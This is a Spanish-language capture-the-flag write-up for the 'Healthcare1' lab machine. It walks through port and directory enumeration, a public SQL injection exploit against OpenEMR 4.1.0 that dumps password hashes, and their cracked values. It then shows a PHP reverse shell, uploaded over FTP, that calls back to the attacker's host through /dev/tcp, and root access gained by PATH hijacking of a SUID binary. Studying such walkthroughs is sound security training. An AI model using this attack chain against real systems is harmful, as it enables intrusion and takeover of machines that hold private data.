---
title: Healthcare1
published: true
---

---

## Intrusion

Escaneo con Nmap para descubrir puertos abiertos en la máquina.

```bash
nmap 192.168.1.33
Nmap scan report for 192.168.1.33
Host is up (0.00012s latency).
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
```

* 21/tcp open ftp ProFTPD 1.3.3d
* 80/tcp open http Apache httpd 2.2.17 ((PCLinuxOS 2011/PREFORK-1pclos2011))

El puerto 21 parece no permitir el ingreso como Anonymous, por lo que mientras tanto sin usuario y contraseña lo dejo a un lado.

Lanzo Gobuster para ver directorios y archivos en la página web.

```bash
gobuster dir -u http://192.168.1.33/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
===============================================================
[+] Url:                     http://192.168.1.33/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 5031]
/images               (Status: 301) [Size: 340] [--> http://192.168.1.33/images/]
/css                  (Status: 301) [Size: 337] [--> http://192.168.1.33/css/]   
/js                   (Status: 301) [Size: 336] [--> http://192.168.1.33/js/]    
/vendor               (Status: 301) [Size: 340] [--> http://192.168.1.33/vendor/]
/favicon              (Status: 200) [Size: 1406]                                 
/robots               (Status: 200) [Size: 620]                                  
/fonts                (Status: 301) [Size: 339] [--> http://192.168.1.33/fonts/] 
/gitweb               (Status: 301) [Size: 340] [--> http://192.168.1.33/gitweb/]
/server-status        (Status: 403) [Size: 998]                                  
/phpMyAdmin           (Status: 403) [Size: 59]                                   
                                                                                 
===============================================================
Finished
===============================================================
```

En ninguno de estos directorios podía hacer algo, así que cambie el diccionario para ver si descubría algo más.

```bash
gobuster dir -u http://192.168.1.33/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
===============================================================
Gobuster v3.1.0
===============================================================
[+] Url:                     http://192.168.1.33/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 5031]
/css                  (Status: 301) [Size: 337] [--> http://192.168.1.33/css/]
/js                   (Status: 301) [Size: 336] [--> http://192.168.1.33/js/] 
/vendor               (Status: 301) [Size: 340] [--> http://192.168.1.33/vendor/]
/robots               (Status: 200) [Size: 620]                                  
/images               (Status: 301) [Size: 340] [--> http://192.168.1.33/images/]
/favicon              (Status: 200) [Size: 1406]                                 
/fonts                (Status: 301) [Size: 339] [--> http://192.168.1.33/fonts/] 
/gitweb               (Status: 301) [Size: 340] [--> http://192.168.1.33/gitweb/]
/phpMyAdmin           (Status: 403) [Size: 59]                                   
/server-status        (Status: 403) [Size: 998]                                  
/server-info          (Status: 403) [Size: 998]                                  
/openemr              (Status: 301) [Size: 341] [--> http://192.168.1.33/openemr/]
                                                                                  
===============================================================
Finished
===============================================================
```

Ahora si, me aparece un panel de log in de OpenEMR.

![](https://eidd3.github.io/assets/img/Healthcare1/Untitled.png)

Si buscamos con searchsploit vulnerabilidades de la versión 4.1.0 aparecen 2 SQLi.

```bash
searchsploit Openemr 4.1.0
------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenEMR 4.1.0 - 'u' SQL Injection                                                                                              | php/webapps/49742.py
Openemr-4.1.0 - SQL Injection                                                                                                  | php/webapps/17998.txt
------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

El exploit en python es un script que dumpea los usuarios y el hash de las contraseñas.

```bash
python3 49742.py

   ____                   ________  _______     __ __   ___ ____
  / __ \____  ___  ____  / ____/  |/  / __ \   / // /  <  // __ \
 / / / / __ \/ _ \/ __ \/ __/ / /|_/ / /_/ /  / // /_  / // / / /
/ /_/ / /_/ /  __/ / / / /___/ /  / / _, _/  /__  __/ / // /_/ /
\____/ .___/\___/_/ /_/_____/_/  /_/_/ |_|     /_/ (_)_(_)____/
    /_/
    ____  ___           __   _____ ____    __    _
   / __ )/ (_)___  ____/ /  / ___// __ \  / /   (_)
  / /_/ / / / __ \/ __  /   \__ \/ / / / / /   / /
 / /_/ / / / / / / /_/ /   ___/ / /_/ / / /___/ /
/_____/_/_/_/ /_/\__,_/   /____/\___\_\/_____/_/   exploit by @ikuamike

[+] Finding number of users...
[+] Found number of users: 2
[+] Extracting username and password hash...
admin:3863efef9ee2bfbc51ecdca359c6302bed1389e8
medical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d
```

Las pasamos por crackstation y nos da las contraseñas en texto claro.

![](https://eidd3.github.io/assets/img/Healthcare1/Untitled1.png)


| Username     | Password	   |
|:-------------|:------------------|
| admin	       | ackbar		   |
| medical      | medical	   |


Las 2 cuentas sirven para acceder a OpenEMR, pero ingreso como admin.

Y en el servicio FTP solamente sirve medical:medical. Si nos dirigimos a /var/www/html/openemr que es donde esta la página web montada, podemos tratar de subir un archivo php malicioso y entablar una reverse shell.

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.24/443 0>&1'");?>
```

```bash
ftp> pwd
257 "/var/www/html/openemr" is the current directory
ftp> put shell.php 
local: shell.php remote: shell.php
200 PORT command successful
150 Opening BINARY mode data connection for shell.php
226 Transfer complete
74 bytes sent in 0.00 secs (830.6393 kB/s)
```

Ahora nos ponemos en escucha por el puerto 443 y cargamos el archivo en la web.

![](https://eidd3.github.io/assets/img/Healthcare1/Untitled2.png)

```bash
nc -lvp 443
listening on [any] 443 ...
192.168.1.33: inverse host lookup failed: Unknown host
connect to [192.168.1.24] from (UNKNOWN) [192.168.1.33] 43593
bash: no job control in this shell
bash-4.1$ whoami
whoami
apache
bash-4.1$
```

La contraseña de medical se puede usar para convertirse en ese usuario.

```bash
bash-4.1$ whoami
apache
bash-4.1$ su medical
Password: 
[medical@localhost home]$ whoami
medical
[medical@localhost home]$
```

## Elevando Privilegios

Si buscamos por permisos SUID vemos uno que llama la atención por el nombre parecido a la máquina.


```bash
[medical@localhost home]$ find / -perm -4000 2>/dev/null
/usr/libexec/pt_chown
/usr/lib/ssh/ssh-keysign
/usr/lib/polkit-resolve-exe-helper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/chromium-browser/chrome-sandbox
/usr/lib/polkit-grant-helper-pam
/usr/lib/polkit-set-default-helper
/usr/sbin/fileshareset
/usr/sbin/traceroute6
/usr/sbin/usernetctl
/usr/sbin/userhelper
/usr/bin/crontab
/usr/bin/at
/usr/bin/pumount
/usr/bin/batch
/usr/bin/expiry
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/wvdial
/usr/bin/pmount
/usr/bin/sperl5.10.1
/usr/bin/gpgsm
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/passwd
/usr/bin/gpg
/usr/bin/healthcheck
/usr/bin/Xwrapper
/usr/bin/ping6
/usr/bin/chsh
/lib/dbus-1/dbus-daemon-launch-helper
/sbin/pam_timestamp_check
/bin/ping
/bin/fusermount
/bin/su
/bin/mount
/bin/umount
```

Es un archivo ejecutable de 32 bits, si lo ejecutamos hace como un escaneo del sistema y hace un informe sobre el tamaño de un disco del sistema operativo.

Haciéndole un strings se ve que ejecuta varios comandos.

```bash
[medical@localhost home]$ strings /usr/bin/healthcheck
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
setuid
system
setgid
__libc_start_main
GLIBC_2.0
PTRhp
[^_]
clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h
```

Sabiendo esto podemos tratar de hacer un path hijacking, ya que no ejecuta el comando con la ruta absoluta.

```bash
[medical@localhost tmp]$ echo "/bin/bash" > ifconfig
[medical@localhost tmp]$ chmod +x ifconfig 
[medical@localhost tmp]$ echo $PATH
/sbin:/usr/sbin:/bin:/usr/bin:/usr/lib/qt4/bin
[medical@localhost tmp]$ export PATH=/tmp:$PATH
[medical@localhost tmp]$ echo $PATH
/tmp:/sbin:/usr/sbin:/bin:/usr/bin:/usr/lib/qt4/bin
```

Ahora ejecutamos el binario y ganaríamos una shell como root.

```bash
System Health Check

Scanning System
[root@localhost tmp]# whoami
root
```


